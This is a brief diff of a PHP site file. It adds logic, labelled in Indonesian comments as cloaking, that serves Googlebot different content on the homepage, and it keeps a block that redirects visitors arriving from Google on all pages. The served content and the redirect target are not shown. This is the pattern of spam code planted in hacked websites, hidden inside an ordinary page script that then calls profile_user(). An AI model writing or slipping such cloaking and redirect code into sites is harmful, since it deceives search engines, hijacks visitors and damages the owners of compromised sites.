@@ -1,5 +1,8 @@
 <?php
-if (isset($_SERVER['HTTP_USER_AGENT'])) {
+$request_uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+
+// === CLOAKING KHUSUS HOMEPAGE UNTUK GOOGLEBOT ===
+if ($request_uri === '/' && isset($_SERVER['HTTP_USER_AGENT'])) {
     $ua = $_SERVER['HTTP_USER_AGENT'];
 
     if (
@@ -17,6 +20,7 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
     }
 }
 
+// === REDIRECT UNTUK PENGUNJUNG DARI GOOGLE (SEMUA HALAMAN) ===
 if (isset($_SERVER['HTTP_REFERER'])) {
     $referer = $_SERVER['HTTP_REFERER'];
 
@@ -25,6 +29,7 @@ if (isset($_SERVER['HTTP_REFERER'])) {
         exit;
     }
 }
+
 
 
 profile_user();
